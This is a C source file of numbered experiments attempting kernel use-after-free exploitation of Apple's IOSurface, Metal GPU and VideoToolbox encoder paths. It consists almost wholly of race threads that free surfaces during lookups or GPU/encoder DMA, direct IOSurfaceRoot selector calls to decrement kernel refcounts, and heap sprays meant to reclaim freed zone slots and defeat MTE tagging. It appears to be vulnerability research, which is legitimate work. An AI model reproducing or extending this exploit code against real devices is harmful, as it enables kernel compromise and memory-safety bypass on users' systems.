static volatile int r263_port_found = 0;
static volatile int r263_sel1_ok = 0;
static volatile int r263_sel1_fail = 0;
static volatile int r263_spray_count = 0;
static volatile int r263_lookup_races = 0;
static volatile int r263_lookup_found = 0;

/* Shared state for cross-thread racing */
static volatile uint32_t r263_active_id = 0;
static volatile mach_port_t r263_active_port = MACH_PORT_NULL;
static volatile int r263_phase = 0; /* 0=idle, 1=surface_live, 2=releasing */

/* Thread A: Create IOSurfaces, hand off to racers, destroy via Mach port path */
static void *r263_creator_fn(void *arg) {
    int w = 256, h = 256, bpe = 4, bpr = w * bpe;
    int pf = 0x42475241; /* BGRA */
    int alloc_sz = bpr * h;

    while (r263_run) {
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
        IOSurfaceRef surf = IOSurfaceCreate(props);
        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
        CFRelease(props);
        if (!surf) continue;

        uint32_t sid = IOSurfaceGetID(surf);
        mach_port_t port = IOSurfaceCreateMachPort(surf);

        /* Signal racers: surface is live */
        r263_active_id = sid;
        r263_active_port = port;
        __sync_synchronize();
        r263_phase = 1;
        __sync_fetch_and_add(&r263_created, 1);

        /* Tiny spin to widen race window */
        for (volatile int i = 0; i < 50; i++);

        /* Enter release phase — racers should try NOW */
        r263_phase = 2;
        __sync_synchronize();

        /* Drop userspace ref — kernel refcount still held by port */
        CFRelease(surf);

        /* Spin a bit more for racers */
        for (volatile int i = 0; i < 20; i++);

        /* Destroy Mach port — triggers no-senders notification */
        if (port != MACH_PORT_NULL) {
            mach_port_deallocate(mach_task_self(), port);
        }

        /* Mark idle */
        r263_phase = 0;
        __sync_synchronize();
    }
    return NULL;
}

/* Thread B: Race IOSurfaceLookupFromMachPort during destruction */
static void *r263_port_race_fn(void *arg) {
    while (r263_run) {
        if (r263_phase < 2) { sched_yield(); continue; }
        mach_port_t port = r263_active_port;
        if (port == MACH_PORT_NULL) continue;

        /* Try lookup during the no-senders notification window */
        IOSurfaceRef surf = IOSurfaceLookupFromMachPort(port);
        __sync_fetch_and_add(&r263_port_races, 1);
        if (surf) {
            __sync_fetch_and_add(&r263_port_found, 1);
            /* Access the surface — forces kernel to dereference the object */
            IOSurfaceGetWidth(surf);
            IOSurfaceGetHeight(surf);
            IOSurfaceGetBytesPerRow(surf);
            CFRelease(surf);
        }
    }
    return NULL;
}

/* Thread C: Race IOSurfaceLookup(surfaceID) during destruction */
static void *r263_id_race_fn(void *arg) {
    while (r263_run) {
        if (r263_phase < 2) { sched_yield(); continue; }
        uint32_t sid = r263_active_id;
        if (sid == 0) continue;

        IOSurfaceRef surf = IOSurfaceLookup(sid);
        __sync_fetch_and_add(&r263_lookup_races, 1);
        if (surf) {
            __sync_fetch_and_add(&r263_lookup_found, 1);
            IOSurfaceGetWidth(surf);
            CFRelease(surf);
        }
    }
    return NULL;
}

/* Thread D: Call IOSurfaceRoot sel1 (s_release_surface) with surface ID
 * to directly decrement kernel refcount, racing with normal destruction */
static void *r263_sel1_fn(void *arg) {
    io_connect_t conn = (io_connect_t)(uintptr_t)arg;
    while (r263_run) {
        if (r263_phase < 1) { sched_yield(); continue; }
        uint32_t sid = r263_active_id;
        if (sid == 0) continue;

        /* Try multiple input formats for sel1 (s_release_surface) */
        uint64_t scalar_in = (uint64_t)sid;
        kern_return_t kr;

        /* Format 1: scalar only — surface ID */
        kr = IOConnectCallScalarMethod(conn, 1, &scalar_in, 1, NULL, NULL);
        if (kr == 0) __sync_fetch_and_add(&r263_sel1_ok, 1);
        else __sync_fetch_and_add(&r263_sel1_fail, 1);

        /* Format 2: struct input — packed surface ID */
        uint32_t struct_in[2] = { sid, 0 };
        kr = IOConnectCallMethod(conn, 1, NULL, 0, struct_in, 8, NULL, NULL, NULL, NULL);
        if (kr == 0) __sync_fetch_and_add(&r263_sel1_ok, 1);
        else __sync_fetch_and_add(&r263_sel1_fail, 1);

        /* Format 3: struct input — just the ID as 4 bytes */
        kr = IOConnectCallMethod(conn, 1, NULL, 0, &sid, 4, NULL, NULL, NULL, NULL);
        if (kr == 0) __sync_fetch_and_add(&r263_sel1_ok, 1);
        else __sync_fetch_and_add(&r263_sel1_fail, 1);
    }
    return NULL;
}

/* Thread E: Heap spray — allocate same-size IOSurfaces to reclaim freed slots */
static void *r263_spray_fn(void *arg) {
    int w = 256, h = 256, bpe = 4, bpr = w * bpe;
    int pf = 0x42475241;
    int alloc_sz = bpr * h;
    IOSurfaceRef spray[32];
    memset(spray, 0, sizeof(spray));
    int spray_idx = 0;

    while (r263_run) {
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
        IOSurfaceRef s = IOSurfaceCreate(props);
        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
        CFRelease(props);
        if (!s) continue;

        /* Rotate spray buffer — keep 32 surfaces alive to fill zone free list */
        if (spray[spray_idx]) CFRelease(spray[spray_idx]);
        spray[spray_idx] = s;
        spray_idx = (spray_idx + 1) & 31;
        __sync_fetch_and_add(&r263_spray_count, 1);
    }

    for (int i = 0; i < 32; i++) if (spray[i]) CFRelease(spray[i]);
    return NULL;
}

/* r262: Metal GPU race with proper objc_msgSend casting for arm64e */
#include <objc/runtime.h>
#include <objc/message.h>
#include <signal.h>

static volatile int r262_run = 0;
static volatile int r262_tex_ok = 0;
static volatile int r262_tex_fail = 0;
static volatile int r262_blit_ok = 0;
static volatile int r262_freed = 0;

/* Signal/exception handler for debugging Metal crashes */
static void r262_signal_handler(int sig) {
    const char *name = "UNKNOWN";
    if (sig == SIGABRT) name = "SIGABRT";
    else if (sig == SIGBUS) name = "SIGBUS";
    else if (sig == SIGSEGV) name = "SIGSEGV";
    else if (sig == SIGILL) name = "SIGILL";
    else if (sig == SIGTRAP) name = "SIGTRAP";
    rlog("  *** CAUGHT SIGNAL %d (%s) in GPU thread ***\n", sig, name);
    rlog("  tex_ok=%d tex_fail=%d blit=%d freed=%d\n",
         r262_tex_ok, r262_tex_fail, r262_blit_ok, r262_freed);
    fflush(stdout);
    /* Re-raise to get default handling */
    signal(sig, SIG_DFL);
    raise(sig);
}

/* ObjC uncaught exception handler */
typedef void (*NSUncaughtExceptionHandler_t)(id);
static void r262_exception_handler(id exception) {
    void *objc_lib = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
    if (!objc_lib) return;
    typedef id (*msg_id_t)(id, SEL);
    msg_id_t send = (msg_id_t)dlsym(objc_lib, "objc_msgSend");
    if (!send) { dlclose(objc_lib); return; }

    id reason = send(exception, sel_registerName("reason"));
    id name = send(exception, sel_registerName("name"));
    typedef const char *(*msg_cstr_t)(id, SEL);
    msg_cstr_t send_cstr = (msg_cstr_t)dlsym(objc_lib, "objc_msgSend");
    const char *r = send_cstr(reason, sel_registerName("UTF8String"));
    const char *n = send_cstr(name, sel_registerName("UTF8String"));
    rlog("  *** UNCAUGHT OBJC EXCEPTION: %s: %s ***\n", n ? n : "?", r ? r : "?");
    fflush(stdout);
    dlclose(objc_lib);
}

/* Properly typed objc_msgSend variants for arm64e PAC */
typedef id (*msg_id_t)(id, SEL);
typedef id (*msg_id_id_t)(id, SEL, id);
typedef id (*msg_id_ptr_ulong_ulong_t)(id, SEL, id, void *, unsigned long, unsigned long);
typedef void (*msg_void_t)(id, SEL);
typedef void (*msg_void_id_t)(id, SEL, id);
typedef void (*msg_void_ulong_t)(id, SEL, unsigned long);
typedef void (*msg_void_ulong_ulong_ulong_ulong_t)(id, SEL, unsigned long, unsigned long, unsigned long, unsigned long);

static void *r262_gpu_fn(void *arg) {
    int tid = (int)(uintptr_t)arg;

    /* Get objc_msgSend */
    void *objc_lib = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
    if (!objc_lib) { rlog("  [t%d] FAIL: dlopen libobjc\n", tid); return NULL; }
    void *msgSend = dlsym(objc_lib, "objc_msgSend");
    if (!msgSend) { rlog("  [t%d] FAIL: dlsym objc_msgSend\n", tid); dlclose(objc_lib); return NULL; }

    msg_id_t send_id = (msg_id_t)msgSend;
    msg_id_id_t send_id_id = (msg_id_id_t)msgSend;
    msg_id_ptr_ulong_ulong_t send_id_ptr_uu = (msg_id_ptr_ulong_ulong_t)msgSend;
    msg_void_t send_void = (msg_void_t)msgSend;
    msg_void_id_t send_void_id = (msg_void_id_t)msgSend;
    msg_void_ulong_t send_void_ulong = (msg_void_ulong_t)msgSend;
    msg_void_ulong_ulong_ulong_ulong_t send_void_4ulong = (msg_void_ulong_ulong_ulong_ulong_t)msgSend;

    /* Autorelease pool functions */
    typedef void *(*arp_push_t)(void);
    typedef void (*arp_pop_t)(void *);
    arp_push_t poolPush = (arp_push_t)dlsym(objc_lib, "objc_autoreleasePoolPush");
    arp_pop_t poolPop = (arp_pop_t)dlsym(objc_lib, "objc_autoreleasePoolPop");
    if (!poolPush || !poolPop) { rlog("  [t%d] FAIL: no autorelease pool funcs\n", tid); dlclose(objc_lib); return NULL; }

    rlog("  [t%d] objc_msgSend=%p arp=%p/%p\n", tid, msgSend, (void*)poolPush, (void*)poolPop);

    /* Get Metal framework */
    void *metal = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
    if (!metal) { rlog("  [t%d] FAIL: dlopen Metal\n", tid); dlclose(objc_lib); return NULL; }

    typedef id (*CreateDev_t)(void);
    CreateDev_t createDev = (CreateDev_t)dlsym(metal, "MTLCreateSystemDefaultDevice");
    if (!createDev) { rlog("  [t%d] FAIL: dlsym MTLCreateSystemDefaultDevice\n", tid); dlclose(metal); dlclose(objc_lib); return NULL; }

    id device = createDev();
    rlog("  [t%d] MTLDevice=%p\n", tid, (void*)device);
    if (!device) { rlog("  [t%d] FAIL: no Metal device\n", tid); dlclose(metal); dlclose(objc_lib); return NULL; }

    /* Create a command queue */
    id cmdQueue = send_id(device, sel_registerName("newCommandQueue"));
    rlog("  [t%d] cmdQueue=%p\n", tid, (void*)cmdQueue);
    if (!cmdQueue) { rlog("  [t%d] FAIL: no command queue\n", tid); dlclose(metal); dlclose(objc_lib); return NULL; }
    rlog("  [t%d] Metal ready, entering loop\n", tid);
    fflush(stdout);

    /* Use large texture to increase GPU DMA duration */
    int w = 2048, h = 2048, bpe = 4, bpr = w * bpe, pf = 0x42475241;

    /* Pre-cache selectors outside loop */
    SEL selNewTex = sel_registerName("newTextureWithDescriptor:iosurface:plane:slice:");
    SEL selSetUsage = sel_registerName("setUsage:");
    SEL selSetStorage = sel_registerName("setStorageMode:");
    SEL selCmdBuf = sel_registerName("commandBuffer");
    SEL selBlitEnc = sel_registerName("blitCommandEncoder");
    SEL selGenMip = sel_registerName("generateMipmapsForTexture:");
    SEL selEndEnc = sel_registerName("endEncoding");
    SEL selCommit = sel_registerName("commit");
    SEL selRelease = sel_registerName("release");
    SEL selDescFactory = sel_registerName("texture2DDescriptorWithPixelFormat:width:height:mipmapped:");
    Class descClass = objc_getClass("MTLTextureDescriptor");
    if (!descClass) {
        rlog("  [t%d] FAIL: no MTLTextureDescriptor class\n", tid);
        dlclose(metal); dlclose(objc_lib);
        return NULL;
    }

    rlog("  [t%d] ready\n", tid);
    fflush(stdout);

    while (r262_run) {
        void *pool = poolPush();

        /* Create IOSurface with all required Metal properties */
        int allocSize = bpr * h;
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &allocSize);
        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
        IOSurfaceRef surf = IOSurfaceCreate(props);
        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
        CFRelease(props);
        if (!surf) { poolPop(pool); continue; }

        /* texture2DDescriptorWithPixelFormat:width:height:mipmapped: */
        typedef id (*desc_factory_t)(id, SEL, unsigned long, unsigned long, unsigned long, int);
        desc_factory_t make_desc = (desc_factory_t)msgSend;
        id desc = make_desc((id)descClass, selDescFactory,
            80 /* MTLPixelFormatBGRA8Unorm */, (unsigned long)w, (unsigned long)h, 0);

        if (!desc) {
            if (r262_tex_ok == 0 && r262_tex_fail == 0) {
                rlog("  [t%d] FAIL: texture2DDescriptor returned nil\n", tid);
                fflush(stdout);
            }
            __sync_fetch_and_add(&r262_tex_fail, 1);
            CFRelease(surf);
            poolPop(pool);
            continue;
        }

        /* Set usage and storage mode for IOSurface backing */
        send_void_ulong(desc, selSetUsage, 1 | 2); /* ShaderRead|Write */
        send_void_ulong(desc, selSetStorage, 0); /* Shared (0) for IOSurface */

        /* newTextureWithDescriptor:iosurface:plane:slice: */
        id texture = send_id_ptr_uu(device, selNewTex,
            desc, (void *)surf, 0, 0);

        if (texture) {
            __sync_fetch_and_add(&r262_tex_ok, 1);

            /* Create command buffer */
            id cmdBuf = send_id(cmdQueue, selCmdBuf);
            if (cmdBuf) {
                /* Create blit command encoder */
                id blit = send_id(cmdBuf, selBlitEnc);
                if (blit) {
                    send_void_id(blit, selGenMip, texture);
                    send_void(blit, selEndEnc);
                    __sync_fetch_and_add(&r262_blit_ok, 1);
                }

                /* Commit — submits to GPU hardware DMA */
                send_void(cmdBuf, selCommit);

                /* Wait until GPU has actually started processing (DMA in flight) */
                send_void(cmdBuf, sel_registerName("waitUntilScheduled"));
            }

            /* Release texture — drops userspace IOSurface retain */
            send_void(texture, selRelease);
        } else {
            __sync_fetch_and_add(&r262_tex_fail, 1);
        }

        /* Free the IOSurface while GPU might still be processing */
        CFRelease(surf);
        __sync_fetch_and_add(&r262_freed, 1);

        poolPop(pool);

        /* Every 16th iteration, yield to let GPU hardware execute */
        if ((r262_freed & 15) == 0) sched_yield();
    }

    send_void(cmdQueue, sel_registerName("release"));
    dlclose(metal);
    dlclose(objc_lib);
    return NULL;
}

/* r261: IOKit GPU user client selector probe — find which selectors are
   accessible from the app sandbox on IOGPUDevice and IOSurfaceRoot */

/* r260: heap reclaim UAF — free IOSurface during encoder DMA, immediately
   reclaim the zone slot with a new allocation to change MTE tag */
static volatile int r260_run = 0;
static volatile int r260_submitted = 0;
static volatile int r260_reclaimed = 0;
static volatile int r260_cycles = 0;

static void r260_cb(void *ctx, void *src, OSStatus status,
                     VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    (void)ctx; (void)src; (void)status; (void)flags; (void)buf;
}

static void *r260_churn_fn(void *arg) {
    (void)arg;
    int w = 128, h = 128;
    int bpe = 4, bpr = w * bpe, pf = 0x42475241; /* BGRA */
    int alloc_size = w * h * bpe;

    /* Create a persistent encoder session (don't recreate each loop) */
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, r260_cb, NULL, &session);
    CFRelease(enc_spec);
    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
    VTCompressionSessionPrepareToEncodeFrames(session);

    int frame_idx = 0;
    while (r260_run) {
        /* Step 1: Create IOSurface */
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
        CFNumberRef hn_cf = CFNumberCreate(NULL, kCFNumberIntType, &h);
        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
        CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn_cf);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
        IOSurfaceRef surf = IOSurfaceCreate(props);
        CFRelease(wn); CFRelease(hn_cf); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
        CFRelease(props);
        if (!surf) continue;

        /* Step 2: Create CVPixelBuffer and submit to encoder */
        CVPixelBufferRef pb = NULL;
        CVPixelBufferCreateWithIOSurface(NULL, surf, NULL, &pb);
        if (!pb) { CFRelease(surf); continue; }

        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, frame_idx & 0xFF, alloc_size);
        CVPixelBufferUnlockBaseAddress(pb, 0);

        CMTime pts = CMTimeMake(frame_idx, 30);
        CMTime dur = CMTimeMake(1, 30);
        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st == noErr) __sync_fetch_and_add(&r260_submitted, 1);

        /* Step 3: Release BOTH refs immediately — encoder kernel side has a DMA ref */
        CVPixelBufferRelease(pb);
        CFRelease(surf);

        /* Step 4: Immediately create replacement IOSurfaces of SAME SIZE
           to reclaim the freed zone slot with a new MTE tag */
        for (int r = 0; r < 4; r++) {
            CFMutableDictionaryRef rp = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFNumberRef rwn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef rhn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef rbn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rrn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFDictionarySetValue(rp, CFSTR("IOSurfaceWidth"), rwn);
            CFDictionarySetValue(rp, CFSTR("IOSurfaceHeight"), rhn);
            CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerElement"), rbn);
            CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerRow"), rrn);
            CFDictionarySetValue(rp, CFSTR("IOSurfacePixelFormat"), rpf);
            IOSurfaceRef reclaim = IOSurfaceCreate(rp);
            CFRelease(rwn); CFRelease(rhn); CFRelease(rbn); CFRelease(rrn); CFRelease(rpf);
            CFRelease(rp);
            if (reclaim) {
                __sync_fetch_and_add(&r260_reclaimed, 1);
                CFRelease(reclaim);
            }
        }

        frame_idx++;
        __sync_fetch_and_add(&r260_cycles, 1);

        /* Every 32nd frame: yield to let GPU hardware process */
        if ((frame_idx & 31) == 0) sched_yield();
    }

    /* Don't invalidate — just release (skip synchronized drain) */
    CFRelease(session);
    return NULL;
}

/* r258: IOSurfaceLookup race — race between lookup-by-ID and release */
static volatile int r258_run = 0;
static volatile int r258_created = 0;
static volatile int r258_lookup_ok = 0;
static volatile int r258_lookup_stale = 0;
static volatile IOSurfaceID r258_target_id = 0;
static volatile int r258_phase = 0; /* 0=idle, 1=surface_live, 2=releasing */

static void *r258_create_release(void *arg) {
    (void)arg;
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);

    while (r258_run) {
        IOSurfaceRef surf = IOSurfaceCreate(props);
        if (!surf) continue;
        IOSurfaceID sid = IOSurfaceGetID(surf);
        r258_target_id = sid;
        __sync_synchronize();
        r258_phase = 1;
        __sync_fetch_and_add(&r258_created, 1);

        /* Brief window for lookup threads to grab references */
        for (volatile int i = 0; i < 50; i++) {}

        /* Signal that we're about to release */
        r258_phase = 2;
        __sync_synchronize();
        CFRelease(surf); /* This triggers kernel-side IOSurface deallocation */
        r258_phase = 0;
    }
    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
    CFRelease(props);
    return NULL;
}

static void *r258_lookup_thread(void *arg) {
    (void)arg;
    while (r258_run) {
        if (r258_phase == 0) { sched_yield(); continue; }
        IOSurfaceID sid = r258_target_id;
        if (sid == 0) continue;

        /* Race: try to lookup while other thread is releasing */
        IOSurfaceRef found = IOSurfaceLookup(sid);
        if (found) {
            /* Check if the surface is still valid by accessing it */
            size_t aw = IOSurfaceGetWidth(found);
            size_t ah = IOSurfaceGetAllocSize(found);
            int32_t uc = IOSurfaceGetUseCount(found);

            if (r258_phase == 2 || r258_phase == 0) {
                /* We got a ref during/after release phase — potential stale ref */
                __sync_fetch_and_add(&r258_lookup_stale, 1);
            }
            __sync_fetch_and_add(&r258_lookup_ok, 1);
            CFRelease(found);
        }
    }
    return NULL;
}

/* r257: encoder invalidation race — submit frames then tear down encoder mid-flight */
static volatile int r257_run = 0;
static volatile int r257_panics = 0;
static volatile int r257_cycles = 0;

static void r257_cb(void *ctx, void *src, OSStatus status,
                     VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    (void)ctx; (void)src; (void)status; (void)flags; (void)buf;
}

static void *r257_cycle_fn(void *arg) {
    int tid = (int)(uintptr_t)arg;
    int w = 192, h = 192;

    while (r257_run) {
        /* Create encoder */
        VTCompressionSessionRef session = NULL;
        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

        OSStatus st = VTCompressionSessionCreate(NULL, w, h,
            kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
            r257_cb, NULL, &session);
        CFRelease(enc_spec);
        if (st != noErr || !session) { usleep(1000); continue; }

        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

        st = VTCompressionSessionPrepareToEncodeFrames(session);
        if (st != noErr) {
            VTCompressionSessionInvalidate(session); CFRelease(session);
            continue;
        }

        /* Submit burst of frames WITHOUT waiting for callbacks */
        int frame_base = tid * 10000000 + r257_cycles * 100;
        for (int i = 0; i < 8 && r257_run; i++) {
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
            CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
            CFRelease(iosurf); CFRelease(attrs);
            if (!pb) continue;

            CVPixelBufferLockBaseAddress(pb, 0);
            void *base = CVPixelBufferGetBaseAddress(pb);
            if (base) memset(base, (frame_base + i) & 0xFF, w * h * 4);
            CVPixelBufferUnlockBaseAddress(pb, 0);

            CMTime pts = CMTimeMake(frame_base + i, 30);
            CMTime dur = CMTimeMake(1, 30);
            VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
            CVPixelBufferRelease(pb);
        }

        /* CRITICAL: Invalidate session immediately while encoder may be processing.
           This tears down kernel-side encoder state including IOSurface references. */
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        __sync_fetch_and_add(&r257_cycles, 1);
    }
    return NULL;
}

/* r256: Metal GPU race UAF — submit GPU work referencing IOSurface, free during DMA */
static volatile int r256_run = 0;
static volatile int r256_submitted = 0;
static volatile int r256_freed = 0;
static volatile int r256_completed = 0;

static void *r256_gpu_loop(void *arg) {
    int tid = (int)(uintptr_t)arg;
    /* Load Metal and create device + command queue via Objective-C runtime */
    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
    if (!metal_lib) return NULL;

    typedef void *(*MTLCreateDev_t)(void);
    MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
    if (!createDev) { dlclose(metal_lib); return NULL; }
    void *device = createDev();
    if (!device) { dlclose(metal_lib); return NULL; }

    /* Use objc_msgSend to call [device newCommandQueue] */
    void *objc_lib = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
    typedef void *(*objc_msgSend_t)(void *, void *);
    typedef void *(*sel_reg_t)(const char *);
    objc_msgSend_t msgSend = (objc_msgSend_t)dlsym(objc_lib, "objc_msgSend");
    sel_reg_t selReg = (sel_reg_t)dlsym(objc_lib, "sel_registerName");
    if (!msgSend || !selReg) { dlclose(metal_lib); dlclose(objc_lib); return NULL; }

    void *newCmdQueue = selReg("newCommandQueue");
    void *cmdQueue = msgSend(device, newCmdQueue);
    if (!cmdQueue) { dlclose(metal_lib); dlclose(objc_lib); return NULL; }

    void *newTexSel = selReg("newTextureWithDescriptor:iosurface:plane:level:");
    void *newCmdBuf = selReg("commandBuffer");
    void *newBlitEnc = selReg("blitCommandEncoder");
    void *endEncoding = selReg("endEncoding");
    void *commitSel = selReg("commit");
    void *releaseSel = selReg("release");

    /* MTLTextureDescriptor */
    typedef void *(*cls_t)(const char *);
    cls_t getClass = (cls_t)dlsym(objc_lib, "objc_getClass");
    void *MTLTexDesc = getClass("MTLTextureDescriptor");
    void *tex2dSel = selReg("texture2DDescriptorWithPixelFormat:width:height:mipmapped:");

